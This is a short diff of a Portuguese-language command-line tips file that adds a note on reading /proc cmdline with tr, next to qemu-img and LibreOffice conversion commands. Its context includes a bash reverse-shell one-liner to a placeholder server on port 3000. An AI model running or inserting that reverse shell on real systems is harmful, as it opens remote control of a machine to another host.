@@ -2962,6 +2962,7 @@ bash -i > /dev/tcp/ip-servidor/3000 0>&1
 
 ```
 ### Converter VHD
+
 ```
 qemu-img convert -f vpc -O raw something.vhd something.raw
 ```
@@ -2997,6 +2998,9 @@ libreoffice --headless --convert-to htm *.odp
 libreoffice --headless --convert-to txt *.htm
 ```
 
+### Lendo cmdline do /proc mais legível
+
+         tr '\0' ' ' </proc/proc-id/cmdline
 
 # Geral
 <a href="#Dicas-ng">`^`</a>
